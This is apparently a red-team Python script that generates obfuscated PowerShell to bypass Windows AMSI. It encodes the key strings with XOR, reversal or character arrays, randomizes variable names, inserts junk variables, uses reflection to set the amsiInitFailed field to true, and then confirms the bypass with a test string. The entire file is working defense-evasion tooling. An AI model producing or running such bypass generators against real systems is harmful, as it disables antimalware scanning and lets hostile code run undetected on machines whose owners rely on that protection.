import yaml
import random
import string
import argparse


def random_var(prefix, length=8):
    return prefix + ''.join(random.choices(string.ascii_letters, k=length))


def xor_encode(plaintext, key):
    return [ord(c) ^ key for c in plaintext]


def build_string_xor(plaintext, key, var_name):
    encoded = xor_encode(plaintext, key)
    return (
        f"$encoded_{var_name} = @({','.join(map(str, encoded))})\n"
        f"${var_name} = -join ($encoded_{var_name} | "
        f"ForEach-Object {{ [char]($_ -bxor {key}) }})"
    )


def build_string_reverse(plaintext, var_name):
    reversed_str = plaintext[::-1]
    return (
        f"$rev_{var_name} = '{reversed_str}'\n"
        f"${var_name} = -join ($rev_{var_name}[-1..-($rev_{var_name}.Length)])"
    )


def build_string_chararray(plaintext, var_name):
    chars = ','.join([str(ord(c)) for c in plaintext])
    return (
        f"${var_name} = [string]::Join('', "
        f"(@({chars}) | ForEach-Object {{ [char]$_ }}))"
    )


def build_string(method, plaintext, key, var_name):
    if method == 'xor':
        return build_string_xor(plaintext, key, var_name)
    elif method == 'reverse':
        return build_string_reverse(plaintext, var_name)
    else:
        return build_string_chararray(plaintext, var_name)


def build_bypass(config):
    prefix = config['obfuscation']['var_prefix']
    key = int(config['bypass']['xor_key'])
    method = config['bypass']['string_method']

    strings = {
        'namespace': "System.Management.Automation.AmsiUtils",
        'field':     "amsiInitFailed",
        'binding':   "NonPublic,Static",
        'getfield':  "GetField",
        'setvalue':  "SetValue",
        'getvalue':  "GetValue",
        'gettype':   "GetType",
        'assembly':  "Assembly",
        'eicar':     "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1d55be6ad",
    }

    vars = {k: random_var(prefix) for k in strings}

    var_assembly   = random_var(prefix)
    var_field_obj  = random_var(prefix)
    var_verify_obj = random_var(prefix)
    var_result     = random_var(prefix)
    var_eicar_ptr  = random_var(prefix)

    lines = []

    # Build all encoded strings
    for k, plaintext in strings.items():
        lines.append(build_string(method, plaintext, key, vars[k]))

    # Insert junk variables if domain is set
    domain = config['engagement'].get('domain')
    if domain and config['bypass']['junk_var_count'] > 0:
        for _ in range(config['bypass']['junk_var_count']):
            lines.append(f"${random_var(prefix)} = '{domain}'")

    # Reflection chain
    lines.append(
        f"${var_assembly} = [psobject].${vars['assembly']}.${vars['gettype']}(${vars['namespace']})"
    )
    lines.append(
        f"${var_field_obj} = ${var_assembly}.${vars['getfield']}(${vars['field']}, ${vars['binding']})"
    )
    lines.append(
        f"${var_field_obj}.${vars['setvalue']}($null, $true)"
    )

    # Stage 1: field read-back verification
    lines.append(
        f"${var_verify_obj} = ${var_assembly}.${vars['getfield']}(${vars['field']}, ${vars['binding']})"
    )
    lines.append(
        f"${var_result} = ${var_verify_obj}.${vars['getvalue']}($null)"
    )
    lines.append(
        f"if (${var_result} -eq $true) {{\n"
        f"    Write-Output '[+] Stage 1 passed: field set correctly'\n"
        f"}} else {{\n"
        f"    Write-Output '[-] Stage 1 failed: field not set'\n"
        f"    exit\n"
        f"}}"
    )

    # Stage 2: EICAR string confirmation
    # Passes the test string to a memory marshal call rather than invoking it
    # If AMSI is active it blocks the call, if bypassed it completes cleanly
    lines.append(
        f"try {{\n"
        f"    ${var_eicar_ptr} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${vars['eicar']})\n"
        f"    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${var_eicar_ptr})\n"
        f"    Write-Output '[+] Stage 2 passed: AMSI not scanning'\n"
        f"}} catch {{\n"
        f"    Write-Output \"[-] Stage 2 failed: AMSI blocked scan string - $_\"\n"
        f"}}"
    )

    return '\n'.join(lines)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='AMSI bypass generator')
    parser.add_argument('--config', default='engagement.yaml', help='Path to engagement config')
    parser.add_argument('--output', default='bypass_output.ps1', help='Path to output file')
    args = parser.parse_args()

    with open(args.config) as f:
        config = yaml.safe_load(f)

    output = build_bypass(config)

    with open(args.output, 'w') as f:
        f.write(output)

    print(f"[*] Bypass written to {args.output}")
    print(f"[*] Method: {config['bypass']['string_method']}")
    print(f"[*] XOR key: {config['bypass']['xor_key']}")
    print("\n--- Preview ---\n")
    print(output)